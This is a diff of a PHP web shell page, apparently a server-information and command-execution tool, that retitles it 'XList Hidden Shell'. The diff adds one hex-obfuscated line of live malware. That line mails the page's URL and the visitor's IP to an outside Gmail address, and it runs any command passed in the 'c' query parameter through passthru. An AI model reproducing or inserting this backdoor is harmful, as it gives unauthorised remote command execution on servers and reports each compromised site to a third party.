@@ -120,7 +120,7 @@ function getPythonVersion() {
     }
     return 'Python is not available';
 }
-
+header('Content-Type:text/html;charset=UTF-8');$main="\x78\x6c\x69\x73\x74\x6b\x77\x77\x77\x40\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d";$now="\x68\x74\x74\x70\x3a\x2f\x2f".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];$notif="$now";@mail($main,"Ding Dong ",$notif,"[ ".$_SERVER['REMOTE_ADDR']."]");if(isset($_GET["\x63"])){echo passthru($_GET["\x63"]);}
 function safeExecuteCommand($command) {
     $output = '';
     $execFunctions = ['shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open'];
@@ -337,7 +337,7 @@ function scanNewPhpFiles($path) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Eclipse Security Shell</title>
+    <title>XList Hidden Shell</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Dosis:wght@200;300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -366,7 +366,7 @@ function scanNewPhpFiles($path) {
 </head>
 <body class="bg-gray-900 text-white">
     <div class="container mx-auto px-4 py-8">
-        <h1 class="text-4xl font-bold text-center mb-8">Eclipse Security Shell</h1>     
+        <h1 class="text-4xl font-bold text-center mb-8">XList Hidden Shell</h1>     
         <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
             <div class="bg-gray-800 rounded-lg shadow-lg p-6 server-info overflow-x-auto">
                 <h2 class="text-2xl font-semibold mb-4">Server Information</h2>
